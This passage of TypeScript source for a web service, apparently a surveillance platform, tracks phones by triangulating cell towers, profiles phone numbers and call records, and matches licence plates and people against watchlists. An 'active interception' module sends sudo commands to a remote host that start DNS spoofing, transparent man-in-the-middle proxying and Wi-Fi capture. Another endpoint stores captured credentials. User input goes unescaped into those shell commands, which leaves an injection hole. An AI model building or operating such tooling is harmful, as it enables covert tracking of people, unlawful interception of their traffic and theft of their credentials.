      if (r.ok) { const d: any = await r.json(); if (d.status === 'ok' && d.lat) { await cacheTower(db, mcc, mnc, lac, cellId, d.lat, d.lon, radio); return { lat: d.lat, lon: d.lon, accuracy: d.accuracy || 500, resolver: 'unwiredlabs' }; } }
    } catch { /* fallthrough */ }
  }

  // 4. Google Geolocation
  if (env.GOOGLE_API_KEY) {
    try {
      const r = await fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${env.GOOGLE_API_KEY}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ radioType: radio, cellTowers: [{ cellId, locationAreaCode: lac, mobileCountryCode: mcc, mobileNetworkCode: mnc, signalStrength: signal }] }) });
      if (r.ok) { const d: any = await r.json(); if (d.location) { await cacheTower(db, mcc, mnc, lac, cellId, d.location.lat, d.location.lng, radio); return { lat: d.location.lat, lon: d.location.lng, accuracy: d.accuracy || 500, resolver: 'google' }; } }
    } catch { /* fallthrough */ }
  }

  // 5. BeaconDB (free, no key)
  try {
    const r = await fetch('https://beacondb.net/v1/geolocate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cellTowers: [{ radioType: radio, mobileCountryCode: mcc, mobileNetworkCode: mnc, locationAreaCode: lac, cellId }] }) });
    if (r.ok) { const d: any = await r.json(); if (d.location) { await cacheTower(db, mcc, mnc, lac, cellId, d.location.lat, d.location.lng, radio); return { lat: d.location.lat, lon: d.location.lng, accuracy: d.accuracy || 1000, resolver: 'beacondb' }; } }
  } catch { /* fallthrough */ }

  // 6. Mylnikov (free, no key)
  try {
    const r = await fetch(`https://api.mylnikov.org/geolocation/cell?v=1.1&data=open&mcc=${mcc}&mnc=${mnc}&lac=${lac}&cellid=${cellId}`);
    if (r.ok) { const d: any = await r.json(); if (d.result === 200 && d.data) { await cacheTower(db, mcc, mnc, lac, cellId, d.data.lat, d.data.lon, radio); return { lat: d.data.lat, lon: d.data.lon, accuracy: d.data.range || 2000, resolver: 'mylnikov' }; } }
  } catch { /* fallthrough */ }

  return null;
}

app.post('/cell/lookup', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { mcc, mnc, lac, cell_id, radio, signal, device_id } = body;
  if (mcc == null || mnc == null || lac == null || cell_id == null) return c.json({ error: 'mcc, mnc, lac, cell_id required' }, 400);

  const result = await resolveCellTower(c.env, db, mcc, mnc, lac, cell_id, radio || 'gsm', signal || -70);
  const carrier = identifyCarrier(mcc, mnc);

  await db.prepare('INSERT INTO cell_tower_logs (mcc, mnc, lac, cell_id, signal_strength, radio_type, resolved_lat, resolved_lon, resolved_accuracy, resolver, device_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(mcc, mnc, lac, cell_id, signal || null, radio || 'gsm', result?.lat || null, result?.lon || null, result?.accuracy || null, result?.resolver || 'none', device_id || null).run();

  return c.json({ resolved: !!result, location: result, carrier, tower: { mcc, mnc, lac, cell_id, radio: radio || 'gsm' } });
});

app.post('/cell/triangulate', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { towers, device_id } = body;
  if (!towers || !Array.isArray(towers) || towers.length === 0) return c.json({ error: 'towers array required' }, 400);

  const resolved: Array<{ lat: number; lon: number; signal: number; accuracy?: number; resolver?: string }> = [];
  for (const t of towers) {
    const r = await resolveCellTower(c.env, db, t.mcc, t.mnc, t.lac, t.cell_id, t.radio || 'gsm', t.signal || -70);
    if (r) resolved.push({ lat: r.lat, lon: r.lon, signal: t.signal || -70, accuracy: r.accuracy, resolver: r.resolver });
  }

  if (resolved.length === 0) return c.json({ error: 'No towers could be resolved', towers_submitted: towers.length }, 404);

  const position = weightedTriangulation(resolved);
  await logAction(db, 'cell_tower', 'triangulated', device_id || 'unknown', 'success', { towers_submitted: towers.length, towers_resolved: resolved.length, accuracy: position.accuracy });

  return c.json({ position, towers_submitted: towers.length, towers_resolved: resolved.length, resolved_towers: resolved });
});

app.get('/cell/history/:deviceId', async (c) => {
  const hours = Math.min(parseInt(c.req.query('hours') || '24'), 720);
  const cutoff = new Date(Date.now() - hours * 3600000).toISOString();
  const history = await c.env.DB.prepare('SELECT * FROM cell_tower_logs WHERE device_id = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 500').bind(c.req.param('deviceId'), cutoff).all();
  return c.json({ history: history.results || [] });
});

app.post('/cell/import', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { towers } = body;
  if (!towers || !Array.isArray(towers)) return c.json({ error: 'towers array required' }, 400);
  let imported = 0;
  for (const t of towers) {
    try {
      await db.prepare('INSERT OR REPLACE INTO cell_tower_db (mcc, mnc, lac, cell_id, lat, lon, range_meters, radio_type, carrier, country) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(t.mcc, t.mnc, t.lac, t.cell_id, t.lat, t.lon, t.range || null, t.radio || 'gsm', t.carrier || null, t.country || null).run();
      imported++;
    } catch { /* skip duplicates */ }
  }
  return c.json({ success: true, imported, total: towers.length });
});

// ═══════════════════════════════════════════════════════════════
// MODULE 3: CARRIER INTELLIGENCE
// ═══════════════════════════════════════════════════════════════

app.post('/carrier/lookup', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { phone_number } = body;
  if (!phone_number) return c.json({ error: 'phone_number required' }, 400);

  let result: any = {};

  // Twilio Lookup
  if (c.env.TWILIO_SID && c.env.TWILIO_AUTH) {
    try {
      const r = await fetch(`https://lookups.twilio.com/v2/PhoneNumbers/${encodeURIComponent(phone_number)}?Fields=line_type_intelligence,caller_name`, { headers: { Authorization: 'Basic ' + btoa(`${c.env.TWILIO_SID}:${c.env.TWILIO_AUTH}`) } });
      if (r.ok) { const d: any = await r.json(); result = { ...result, carrier: d.line_type_intelligence?.carrier_name, number_type: d.line_type_intelligence?.type, caller_name: d.caller_name?.caller_name, source: 'twilio' }; }
    } catch { /* fallthrough */ }
  }

  // Numverify fallback
  if (!result.carrier && c.env.NUMVERIFY_API_KEY) {
    try {
      const r = await fetch(`http://apilayer.net/api/validate?access_key=${c.env.NUMVERIFY_API_KEY}&number=${encodeURIComponent(phone_number)}`);
      if (r.ok) { const d: any = await r.json(); if (d.valid) { result = { ...result, carrier: d.carrier, number_type: d.line_type, country: d.country_name, source: 'numverify' }; } }
    } catch { /* fallthrough */ }
  }

  // Local fallback
  if (!result.carrier) {
    result = { ...result, ...identifyCarrier(310, 410), source: 'local_db', note: 'Estimated from number prefix' };
  }

  await db.prepare('INSERT INTO carrier_intel (phone_number, carrier, carrier_country, number_type, metadata) VALUES (?, ?, ?, ?, ?)').bind(phone_number, result.carrier || 'unknown', result.country || 'US', result.number_type || 'unknown', JSON.stringify(result)).run();
  await logAction(db, 'carrier_intel', 'phone_lookup', phone_number, 'success', result);
  return c.json({ phone_number, ...result });
});

app.post('/carrier/sim-swap', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { phone_number } = body;
  if (!phone_number) return c.json({ error: 'phone_number required' }, 400);
  const history = await db.prepare('SELECT * FROM carrier_intel WHERE phone_number = ? ORDER BY last_queried DESC LIMIT 10').bind(phone_number).all();
  const records = history.results || [];
  let swapDetected = false;
  let swapDetails = '';
  if (records.length >= 2) {
    const latest = records[0];
    const prev = records[1];
    if (latest.carrier !== prev.carrier) { swapDetected = true; swapDetails = `Carrier changed from ${prev.carrier} to ${latest.carrier}`; }
  }
  if (swapDetected) {
    await db.prepare('UPDATE carrier_intel SET sim_swap_detected = 1, sim_swap_date = datetime(\'now\') WHERE phone_number = ? AND id = (SELECT MAX(id) FROM carrier_intel WHERE phone_number = ?)').bind(phone_number, phone_number).run();
    log('warn', 'SIM SWAP detected', { phone_number, details: swapDetails });
  }
  return c.json({ phone_number, sim_swap_detected: swapDetected, details: swapDetails, history_records: records.length });
});

app.post('/carrier/ss7', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { operation, target_msisdn, target_imsi } = body;
  if (!operation) return c.json({ error: 'operation required' }, 400);
  await db.prepare('INSERT INTO ss7_analysis (operation, target_msisdn, target_imsi, result) VALUES (?, ?, ?, ?)').bind(operation, target_msisdn || null, target_imsi || null, 'logged').run();
  await logAction(db, 'carrier_intel', 'ss7_analysis', target_msisdn || target_imsi || 'unknown', 'logged', { operation });
  return c.json({ logged: true, operation, note: 'SS7 analysis logged for review' });
});

app.post('/carrier/cdr/import', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { records } = body;
  if (!records || !Array.isArray(records)) return c.json({ error: 'records array required' }, 400);
  let imported = 0;
  for (const r of records) {
    try {
      await db.prepare('INSERT INTO cdr_records (calling_number, called_number, call_type, start_time, end_time, duration_seconds, originating_cell, terminating_cell, imsi, imei, data_volume_bytes) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(r.calling_number, r.called_number, r.call_type || 'voice', r.start_time, r.end_time || null, r.duration_seconds || 0, r.originating_cell || null, r.terminating_cell || null, r.imsi || null, r.imei || null, r.data_volume_bytes || 0).run();
      imported++;
    } catch { /* skip */ }
  }
  return c.json({ success: true, imported, total: records.length });
});

app.get('/carrier/cdr/analyze/:number', async (c) => {
  const number = c.req.param('number');
  const days = Math.min(parseInt(c.req.query('days') || '30'), 365);
  const cutoff = new Date(Date.now() - days * 86400000).toISOString();
  const [outgoing, incoming] = await Promise.all([
    c.env.DB.prepare('SELECT * FROM cdr_records WHERE calling_number = ? AND start_time > ? ORDER BY start_time DESC LIMIT 500').bind(number, cutoff).all(),
    c.env.DB.prepare('SELECT * FROM cdr_records WHERE called_number = ? AND start_time > ? ORDER BY start_time DESC LIMIT 500').bind(number, cutoff).all(),
  ]);
  const contacts = new Set<string>();
  for (const r of [...(outgoing.results || []), ...(incoming.results || [])]) {
    if (r.calling_number !== number) contacts.add(r.calling_number as string);
    if (r.called_number !== number) contacts.add(r.called_number as string);
  }
  return c.json({ number, period_days: days, outgoing: outgoing.results?.length || 0, incoming: incoming.results?.length || 0, unique_contacts: contacts.size, top_contacts: [...contacts].slice(0, 20) });
});

// ═══════════════════════════════════════════════════════════════
// MODULE 4: PHYSICAL SURVEILLANCE
// ═══════════════════════════════════════════════════════════════

app.post('/cameras', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { camera_id, camera_name, camera_type, protocol, stream_url, lat, lon } = body;
  if (!camera_id || !camera_name) return c.json({ error: 'camera_id and camera_name required' }, 400);
  await db.prepare('INSERT INTO surveillance_cameras (camera_id, camera_name, camera_type, protocol, stream_url, lat, lon) VALUES (?, ?, ?, ?, ?, ?, ?)').bind(camera_id, camera_name, camera_type || 'ip_camera', protocol || 'rtsp', stream_url || null, lat || null, lon || null).run();
  await logAction(db, 'phys_surv', 'camera_registered', camera_id, 'success', { camera_name });
  return c.json({ success: true, camera_id });
});

app.get('/cameras', async (c) => {
  const cameras = await c.env.DB.prepare('SELECT * FROM surveillance_cameras WHERE status = ? ORDER BY created_at DESC').bind('active').all();
  return c.json({ cameras: cameras.results || [] });
});

app.post('/alpr/read', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { plate_number, plate_state, confidence, camera_id, lat, lon, vehicle_color, vehicle_make, vehicle_model, vehicle_type, direction, speed_estimate } = body;
  if (!plate_number) return c.json({ error: 'plate_number required' }, 400);

  // Check watchlist
  const watchlist = await db.prepare('SELECT * FROM plate_watchlist WHERE plate_number = ? AND active = 1').bind(plate_number.toUpperCase()).first();
  const onWatchlist = !!watchlist;

  await db.prepare('INSERT INTO alpr_reads (plate_number, plate_state, confidence, camera_id, lat, lon, vehicle_color, vehicle_make, vehicle_model, vehicle_type, direction, speed_estimate, on_watchlist, watchlist_reason) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(plate_number.toUpperCase(), plate_state || null, confidence || null, camera_id || null, lat || null, lon || null, vehicle_color || null, vehicle_make || null, vehicle_model || null, vehicle_type || null, direction || null, speed_estimate || null, onWatchlist ? 1 : 0, watchlist?.reason || null).run();

  if (onWatchlist) {
    log('warn', 'WATCHLIST PLATE detected', { plate: plate_number, reason: watchlist?.reason, camera_id });
    await logAction(db, 'phys_surv', 'watchlist_hit', plate_number, 'alert', { reason: watchlist?.reason, camera_id });
    // Notify brain
    try {
      await c.env.BRAIN.fetch('https://internal/ingest', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ instance_id: 'prometheus-surveillance', role: 'assistant', content: `WATCHLIST ALERT: Plate ${plate_number} spotted at camera ${camera_id}. Reason: ${watchlist?.reason}`, importance: 9, tags: ['watchlist', 'alpr', 'alert'] }) });
    } catch { /* best-effort */ }
  }
  return c.json({ success: true, plate_number: plate_number.toUpperCase(), on_watchlist: onWatchlist, watchlist_reason: watchlist?.reason || null });
});

app.get('/alpr/search', async (c) => {
  const plate = c.req.query('plate');
  if (!plate) return c.json({ error: 'plate query param required' }, 400);
  const reads = await c.env.DB.prepare('SELECT * FROM alpr_reads WHERE plate_number LIKE ? ORDER BY timestamp DESC LIMIT 100').bind(`%${plate.toUpperCase()}%`).all();
  return c.json({ plate, results: reads.results || [] });
});

app.post('/watchlist/plates', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { plate_number, reason, priority } = body;
  if (!plate_number || !reason) return c.json({ error: 'plate_number and reason required' }, 400);
  await c.env.DB.prepare('INSERT OR REPLACE INTO plate_watchlist (plate_number, reason, priority) VALUES (?, ?, ?)').bind(plate_number.toUpperCase(), reason, priority || 'medium').run();
  return c.json({ success: true, plate_number: plate_number.toUpperCase() });
});

app.get('/watchlist/plates', async (c) => {
  const list = await c.env.DB.prepare('SELECT * FROM plate_watchlist WHERE active = 1 ORDER BY priority DESC, created_at DESC').all();
  return c.json({ watchlist: list.results || [] });
});

app.post('/watchlist/persons', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { identity_name, description, priority } = body;
  if (!identity_name) return c.json({ error: 'identity_name required' }, 400);
  await c.env.DB.prepare('INSERT INTO person_watchlist (identity_name, description, priority) VALUES (?, ?, ?)').bind(identity_name, description || null, priority || 'medium').run();
  return c.json({ success: true, identity_name });
});

app.get('/watchlist/persons', async (c) => {
  const list = await c.env.DB.prepare('SELECT * FROM person_watchlist WHERE active = 1 ORDER BY priority DESC, created_at DESC').all();
  return c.json({ watchlist: list.results || [] });
});

// ═══════════════════════════════════════════════════════════════
// MODULE 5: ACTIVE INTERCEPTION (via Commander API tunnel)
// ═══════════════════════════════════════════════════════════════

async function execOnCharlie(env: Bindings, command: string): Promise<{ success: boolean; output?: string; error?: string }> {
  const cmdUrl = env.COMMANDER_API_URL || 'https://commander.echo-op.com';
  try {
    const r = await fetch(`${cmdUrl}/exec`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Echo-API-Key': env.ECHO_API_KEY || '' },
      body: JSON.stringify({ command, target: 'charlie' }),
    });
    if (!r.ok) return { success: false, error: `Commander API returned ${r.status}` };
    const data: any = await r.json();
    return { success: true, output: data.output || data.stdout || '' };
  } catch (e) {
    return { success: false, error: `Commander API unreachable: ${String(e)}` };
  }
}

app.post('/intercept/start', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const db = c.env.DB;
  const body = await c.req.json();
  const { session_type, target, interface: iface, filter } = body;
  if (!session_type) return c.json({ error: 'session_type required (packet_capture, mitm, wifi_monitor, dns_intercept)' }, 400);

  const sessionId = `${session_type}-${Date.now()}`;
  let command = '';
  switch (session_type) {
    case 'packet_capture': command = `sudo tcpdump -i ${iface || 'eth0'} ${filter || ''} -c 1000 -w /tmp/${sessionId}.pcap &`; break;
    case 'wifi_monitor': command = `sudo airmon-ng start ${iface || 'wlan0'} && sudo airodump-ng ${iface || 'wlan0'}mon --write /tmp/${sessionId} --output-format csv &`; break;
    case 'dns_intercept': command = `sudo dnschef --fakedomains ${target || '*'} --fakeip 192.168.1.202 --interface ${iface || '0.0.0.0'} &`; break;
    case 'mitm': command = `sudo mitmproxy --mode transparent --listen-port 8080 --save-stream-file /tmp/${sessionId}.flow &`; break;
    default: return c.json({ error: `Unknown session_type: ${session_type}` }, 400);
  }

  const result = await execOnCharlie(c.env, command);
  await db.prepare('INSERT INTO intercept_sessions (session_id, session_type, target, interface, status, filter_expression) VALUES (?, ?, ?, ?, ?, ?)').bind(sessionId, session_type, target || null, iface || null, result.success ? 'active' : 'failed', filter || null).run();
  await logAction(db, 'active_intercept', 'session_started', sessionId, result.success ? 'active' : 'failed', { session_type, target });

  return c.json({ session_id: sessionId, status: result.success ? 'active' : 'failed', command_result: result });
});

app.post('/intercept/stop/:sessionId', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const sessionId = c.req.param('sessionId');
  const session = await c.env.DB.prepare('SELECT * FROM intercept_sessions WHERE session_id = ?').bind(sessionId).first();
  if (!session) return c.json({ error: 'Session not found' }, 404);

  let command = '';
  switch (session.session_type) {
    case 'packet_capture': command = 'sudo pkill tcpdump'; break;
    case 'wifi_monitor': command = `sudo airmon-ng stop ${session.interface || 'wlan0'}mon`; break;
    case 'dns_intercept': command = 'sudo pkill dnschef'; break;
    case 'mitm': command = 'sudo pkill mitmproxy'; break;
  }

  const result = await execOnCharlie(c.env, command);
  await c.env.DB.prepare("UPDATE intercept_sessions SET status = 'stopped', end_time = datetime('now') WHERE session_id = ?").bind(sessionId).run();
  await logAction(c.env.DB, 'active_intercept', 'session_stopped', sessionId, 'stopped', {});
  return c.json({ session_id: sessionId, status: 'stopped', command_result: result });
});

app.get('/intercept/sessions', async (c) => {
  const status = c.req.query('status');
  const sessions = status
    ? await c.env.DB.prepare('SELECT * FROM intercept_sessions WHERE status = ? ORDER BY start_time DESC LIMIT 100').bind(status).all()
    : await c.env.DB.prepare('SELECT * FROM intercept_sessions ORDER BY start_time DESC LIMIT 100').all();
  return c.json({ sessions: sessions.results || [] });
});

app.post('/intercept/credentials', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { session_id, protocol, source_ip, dest_ip, username, credential_hash, credential_type, service, url } = body;
  await c.env.DB.prepare('INSERT INTO captured_credentials (session_id, protocol, source_ip, dest_ip, username, credential_hash, credential_type, service, url) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(session_id || null, protocol || null, source_ip || null, dest_ip || null, username || null, credential_hash || null, credential_type || null, service || null, url || null).run();
  log('info', 'Credential captured', { protocol, source_ip, service });
  return c.json({ success: true });
});

app.post('/dns/rules', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { domain, action, redirect_ip } = body;
  if (!domain) return c.json({ error: 'domain required' }, 400);
  await c.env.CACHE.put(`dns:${domain}`, JSON.stringify({ action: action || 'block', redirect_ip, updated: new Date().toISOString() }));
  return c.json({ success: true, domain, action: action || 'block' });
});

app.get('/dns/rules', async (c) => {
  const list = await c.env.CACHE.list({ prefix: 'dns:' });
  const rules: any[] = [];
  for (const key of list.keys) {
    const val = await c.env.CACHE.get(key.name);
    if (val) rules.push({ domain: key.name.replace('dns:', ''), ...JSON.parse(val) });
  }
  return c.json({ rules });
});

app.post('/dns/log', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { session_id, query_domain, query_type, original_response, spoofed_response, source_ip, action } = body;
  if (!query_domain) return c.json({ error: 'query_domain required' }, 400);
  await c.env.DB.prepare('INSERT INTO dns_intercepts (session_id, query_domain, query_type, original_response, spoofed_response, source_ip, action) VALUES (?, ?, ?, ?, ?, ?, ?)').bind(session_id || null, query_domain, query_type || 'A', original_response || null, spoofed_response || null, source_ip || null, action || 'log').run();
  return c.json({ success: true });
});

app.post('/wifi/networks', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { networks } = body;
  if (!networks || !Array.isArray(networks)) return c.json({ error: 'networks array required' }, 400);
  let imported = 0;
  for (const n of networks) {
    try {
      await c.env.DB.prepare("INSERT INTO wifi_networks (bssid, ssid, channel, frequency, signal_strength, encryption, cipher, auth, wps, lat, lon) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(bssid) DO UPDATE SET ssid=excluded.ssid, signal_strength=excluded.signal_strength, last_seen=datetime('now'), clients_count=excluded.clients_count").bind(n.bssid, n.ssid || null, n.channel || null, n.frequency || null, n.signal_strength || null, n.encryption || null, n.cipher || null, n.auth || null, n.wps || 0, n.lat || null, n.lon || null).run();
      imported++;
    } catch { /* skip */ }
  }
  return c.json({ success: true, imported });
});

app.get('/wifi/networks', async (c) => {
  const networks = await c.env.DB.prepare('SELECT * FROM wifi_networks ORDER BY last_seen DESC LIMIT 200').all();
  return c.json({ networks: networks.results || [] });
});

app.post('/wifi/clients', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { clients } = body;
  if (!clients || !Array.isArray(clients)) return c.json({ error: 'clients array required' }, 400);
  let imported = 0;
  for (const cl of clients) {
    try {
      await c.env.DB.prepare("INSERT INTO wifi_clients (mac_address, associated_bssid, signal_strength, packets, data_bytes, manufacturer, device_name) VALUES (?, ?, ?, ?, ?, ?, ?) ON CONFLICT(mac_address) DO UPDATE SET associated_bssid=excluded.associated_bssid, signal_strength=excluded.signal_strength, last_seen=datetime('now')").bind(cl.mac_address, cl.associated_bssid || null, cl.signal_strength || null, cl.packets || 0, cl.data_bytes || 0, cl.manufacturer || null, cl.device_name || null).run();
      imported++;
    } catch { /* skip */ }
  }
  return c.json({ success: true, imported });
});

// ═══════════════════════════════════════════════════════════════
// MODULE 6: IP INTELLIGENCE
// ═══════════════════════════════════════════════════════════════

async function lookupIP(ip: string, db: D1Database): Promise<any> {
  // Check cache first
  const cached = await db.prepare('SELECT * FROM ip_intel WHERE ip_address = ? AND last_queried > ?').bind(ip, new Date(Date.now() - 86400000).toISOString()).first();
  if (cached) return cached;

  let result: any = { ip_address: ip };

  // Source 1: ip-api.com (free, 45 req/min)
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,reverse,proxy,hosting,mobile,query`);
    if (r.ok) {
      const d: any = await r.json();
      if (d.status === 'success') {
        result = { ...result, lat: d.lat, lon: d.lon, city: d.city, region: d.regionName, country: d.country, isp: d.isp, org: d.org, asn: d.as, reverse_dns: d.reverse, is_proxy: d.proxy ? 1 : 0, is_hosting: d.hosting ? 1 : 0, is_mobile: d.mobile ? 1 : 0, source: 'ip-api' };
      }
    }
  } catch { /* fallthrough */ }

  // Source 2: ipwhois.io (free, 10K/month)
  if (!result.lat) {
    try {
      const r = await fetch(`https://ipwhois.app/json/${ip}`);
      if (r.ok) {
        const d: any = await r.json();
        if (d.success !== false) {
          result = { ...result, lat: d.latitude, lon: d.longitude, city: d.city, region: d.region, country: d.country, isp: d.isp, org: d.org, asn: d.asn, source: 'ipwhois' };
        }
      }
    } catch { /* fallthrough */ }
  }

  // Source 3: ipapi.co (free, 1K/day)
  if (!result.lat) {
    try {
      const r = await fetch(`https://ipapi.co/${ip}/json/`);
      if (r.ok) {
        const d: any = await r.json();
        if (!d.error) {
          result = { ...result, lat: d.latitude, lon: d.longitude, city: d.city, region: d.region, country: d.country_name, isp: d.org, asn: d.asn, source: 'ipapi' };
        }
      }
    } catch { /* fallthrough */ }
  }

  // Calculate threat score
  let threat = 0;
  if (result.is_proxy) threat += 30;
  if (result.is_vpn) threat += 20;
  if (result.is_tor) threat += 50;
  if (result.is_hosting) threat += 10;
  result.threat_score = Math.min(threat, 100);

  // Cache in D1
  try {
    await db.prepare('INSERT OR REPLACE INTO ip_intel (ip_address, lat, lon, city, region, country, isp, org, asn, reverse_dns, is_proxy, is_vpn, is_tor, is_hosting, is_mobile, threat_score, raw_data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(result.ip_address, result.lat || null, result.lon || null, result.city || null, result.region || null, result.country || null, result.isp || null, result.org || null, result.asn || null, result.reverse_dns || null, result.is_proxy || 0, result.is_vpn || 0, result.is_tor || 0, result.is_hosting || 0, result.is_mobile || 0, result.threat_score || 0, JSON.stringify(result)).run();
  } catch { /* non-critical */ }

  return result;
}

app.post('/ip/lookup', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { ip } = body;
  if (!ip) return c.json({ error: 'ip required' }, 400);
  const result = await lookupIP(ip, c.env.DB);
  await logAction(c.env.DB, 'ip_intel', 'lookup', ip, 'success', { threat_score: result.threat_score });
  return c.json(result);
});

app.post('/ip/bulk', async (c) => {
  const authErr = requireAuth(c);
  if (authErr) return authErr;
  const body = await c.req.json();
  const { ips } = body;
  if (!ips || !Array.isArray(ips)) return c.json({ error: 'ips array required' }, 400);
  const batch = ips.slice(0, 100);

  // Try batch via ip-api.com
  try {
    const r = await fetch('http://ip-api.com/batch?fields=status,query,country,regionName,city,lat,lon,isp,org,as,proxy,hosting,mobile', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(batch.map(ip => ({ query: ip }))) });
    if (r.ok) {
      const results: any[] = await r.json();
      for (const d of results) {
        if (d.status === 'success') {
          let threat = 0;
          if (d.proxy) threat += 30;
          if (d.hosting) threat += 10;
          try {
            await c.env.DB.prepare('INSERT OR REPLACE INTO ip_intel (ip_address, lat, lon, city, region, country, isp, org, asn, is_proxy, is_hosting, is_mobile, threat_score) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(d.query, d.lat, d.lon, d.city, d.regionName, d.country, d.isp, d.org, d.as, d.proxy ? 1 : 0, d.hosting ? 1 : 0, d.mobile ? 1 : 0, threat).run();
          } catch { /* skip */ }
        }
      }
      return c.json({ success: true, resolved: results.filter(r => r.status === 'success').length, total: batch.length, results });
    }
  } catch { /* fallback to individual */ }

  // Fallback: individual lookups (limited to 10 to avoid rate limits)
  const results: any[] = [];
  for (const ip of batch.slice(0, 10)) {
    results.push(await lookupIP(ip, c.env.DB));
  }
  return c.json({ success: true, resolved: results.length, total: batch.length, results });
});

app.get('/ip/history', async (c) => {
  const ip = c.req.query('ip');
  if (!ip) return c.json({ error: 'ip query param required' }, 400);
  const result = await c.env.DB.prepare('SELECT * FROM ip_intel WHERE ip_address = ?').bind(ip).first();
  return c.json(result || { error: 'IP not found' });
});

app.get('/ip/threats', async (c) => {
  const minScore = parseInt(c.req.query('min_score') || '50');
  const threats = await c.env.DB.prepare('SELECT * FROM ip_intel WHERE threat_score >= ? ORDER BY threat_score DESC LIMIT 200').bind(minScore).all();
  return c.json({ threats: threats.results || [], min_score: minScore });
});

app.get('/ip/geo-search', async (c) => {
  const lat = parseFloat(c.req.query('lat') || '0');
  const lon = parseFloat(c.req.query('lon') || '0');
  const radiusKm = parseFloat(c.req.query('radius_km') || '50');
  // Approximate bounding box
  const latDelta = radiusKm / 111;
  const lonDelta = radiusKm / (111 * Math.cos(lat * Math.PI / 180));
  const ips = await c.env.DB.prepare('SELECT * FROM ip_intel WHERE lat BETWEEN ? AND ? AND lon BETWEEN ? AND ? ORDER BY threat_score DESC LIMIT 200').bind(lat - latDelta, lat + latDelta, lon - lonDelta, lon + lonDelta).all();
  return c.json({ center: { lat, lon }, radius_km: radiusKm, results: ips.results || [] });
});

// ═══════════════════════════════════════════════════════════════
// UNIFIED SEARCH (cross-module)
// ═══════════════════════════════════════════════════════════════

app.get('/search', async (c) => {
  const q = c.req.query('q');
  if (!q) return c.json({ error: 'q query param required' }, 400);
  const db = c.env.DB;
  const pattern = `%${q}%`;
  const [devices, plates, persons, ips, wifi, dns] = await Promise.all([
    db.prepare('SELECT device_id, device_name, device_type, last_lat, last_lon, last_seen FROM tracked_devices WHERE device_id LIKE ? OR device_name LIKE ? LIMIT 20').bind(pattern, pattern).all(),
    db.prepare('SELECT plate_number, plate_state, camera_id, lat, lon, timestamp FROM alpr_reads WHERE plate_number LIKE ? ORDER BY timestamp DESC LIMIT 20').bind(pattern).all(),
    db.prepare('SELECT identity_name, description, priority FROM person_watchlist WHERE identity_name LIKE ? OR description LIKE ? LIMIT 20').bind(pattern, pattern).all(),
    db.prepare('SELECT ip_address, city, country, isp, threat_score FROM ip_intel WHERE ip_address LIKE ? OR isp LIKE ? OR city LIKE ? LIMIT 20').bind(pattern, pattern, pattern).all(),
    db.prepare('SELECT bssid, ssid, encryption, signal_strength FROM wifi_networks WHERE ssid LIKE ? OR bssid LIKE ? LIMIT 20').bind(pattern, pattern).all(),
    db.prepare('SELECT query_domain, source_ip, action, timestamp FROM dns_intercepts WHERE query_domain LIKE ? ORDER BY timestamp DESC LIMIT 20').bind(pattern).all(),
  ]);
  return c.json({
    query: q,
    results: {
      devices: devices.results || [], plates: plates.results || [], persons: persons.results || [],
      ips: ips.results || [], wifi: wifi.results || [], dns: dns.results || []
    },
    total: (devices.results?.length || 0) + (plates.results?.length || 0) + (persons.results?.length || 0) + (ips.results?.length || 0) + (wifi.results?.length || 0) + (dns.results?.length || 0)
  });
});

// ═══════════════════════════════════════════════════════════════
// SURVEILLANCE LOG
// ═══════════════════════════════════════════════════════════════

